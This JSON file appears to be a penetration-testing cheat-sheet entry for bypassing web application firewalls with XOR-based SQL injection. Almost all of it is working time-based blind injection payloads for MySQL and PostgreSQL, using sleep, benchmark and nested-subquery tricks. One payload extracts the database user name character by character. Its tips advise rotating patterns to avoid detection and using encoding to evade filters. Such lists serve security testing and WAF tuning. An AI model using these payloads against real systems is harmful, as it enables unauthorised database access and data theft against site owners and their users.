{
    "id": "sqli-xor-waf-bypass",
    "title": "SQL Injection XOR WAF Bypass Methodology",
    "category": "Web Security",
    "command_groups": [
        {
            "subtitle": "Time-Based XOR Payloads",
            "info": "XOR-based payloads using sleep functions for blind SQL injection",
            "commands": [
                "'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z",
                "X'XOR(if(now()=sysdate(),//sleep(10)//,0))XOR'X",
                "X'XOR(if(now()=sysdate(),(sleep(10)),0))XOR'X",
                "0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z",
                "0'XOR(if(now()=sysdate(),sleep(10*1),0))XOR'Z",
                "XOR(if(now()=sysdate(),sleep(7),0))XOR%23"
            ]
        },
        {
            "subtitle": "Nested Query XOR Payloads",
            "info": "Complex nested queries with XOR operations for WAF evasion",
            "commands": [
                "X'XOR(if((select now()=sysdate()),BENCHMARK(10000000,md5('xyz')),0))XOR'X",
                "'XOR(SELECT(0)FROM(SELECT(SLEEP(10)))a)XOR'Z",
                "(SELECT(0)FROM(SELECT(SLEEP(10)))a)'XOR(if(now()=sysdate(),sleep(10),0))OR'",
                "'%2b(select*from(select(sleep(10)))a)%2b'",
                "1'%2b(select*from(select(sleep(10)))a)%2b'"
            ]
        },
        {
            "subtitle": "Conditional XOR Payloads",
            "info": "XOR payloads with conditional logic for WAF bypass",
            "commands": [
                "'OR (CASE WHEN ((CLOCK_TIMESTAMP() - NOW()) < '0:0:10') THEN (SELECT '1'||PG_SLEEP(10)) ELSE '0' END)='1",
                "if(now()=sysdate(),sleep(10),0)/'XOR(if(now()=sysdate(),sleep(10),0))OR'",
                "if(now()=sysdate(),sleep(10),0)/'XOR(if(now()=sysdate(),sleep(10),0))OR''XOR(if(now()=sysdate(),sleep(10),0) and 1=1)'/",
                "'%20and%20(select%20%20from%20(select(if(substring(user(),1,1)='p',sleep(10),1)))a)--%20"
            ]
        }
    ],
    "tips": [
        "Rotate between different XOR payload patterns to avoid detection",
        "Adjust sleep times based on target response characteristics",
        "Use URL encoding selectively to bypass WAF filters",
        "Combine XOR with other SQL operators for better evasion",
        "Test payloads with different string terminators",
        "Monitor response times carefully for blind injection confirmation",
        "Use nested queries to increase WAF bypass success rate",
        "Implement different sleep functions based on the database type"
    ]
}
